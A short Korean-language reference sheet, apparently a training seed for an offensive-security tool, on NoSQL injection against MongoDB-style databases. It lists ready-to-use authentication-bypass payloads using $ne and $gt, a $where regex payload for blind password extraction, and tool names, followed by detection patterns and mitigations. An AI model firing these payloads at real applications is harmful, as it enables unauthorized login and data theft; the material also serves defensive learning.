# 학습 시드(심화): nosql-injection

> 종합 레퍼런스(확립된 보안 지식 · 권위 출처 검증가능). 라이브 최신화: `assassin --learn nosql-injection`. P1: 머신별 라이트업 미참조.

## 개요
NoSQL 주입(MongoDB 등): 쿼리 연산자·JS 평가 주입으로 인증우회·데이터유출. 문서형 DB 특성상 연산자 객체가 위험.

## 핵심 기법 · 열거
- 인증우회: {"user":"admin","pass":{"$ne":null}} 또는 {"$gt":""}
- 연산자 주입: $where(JS 실행)·$regex(블라인드 추출)·$gt/$lt
- JSON vs URL 인코딩 차이 악용(username[$ne]=1)
- 블라인드: $regex 로 한 글자씩 비밀번호 추출

## 표준 도구 · 명령
```
username[$ne]=1&password[$ne]=1             # 폼 인증우회
{"username":"admin","password":{"$ne":null}}  # JSON 바디
{"$where":"this.password.match(/^a/)"}   # 블라인드 regex
nosqlmap / 수동 Burp Intruder 로 $regex 브루트
```

## 블루팀 탐지
입력에 $연산자·대괄호 파라미터([$ne])·JS 구문 포함 요청 탐지. 애플리케이션 로그의 비정상 쿼리 객체.

## 완화
입력 타입 검증(문자열 강제)·연산자 키 거부·$where 비활성·ODM 스키마 검증.

- 출처(검증): https://portswigger.net/web-security/nosql-injection
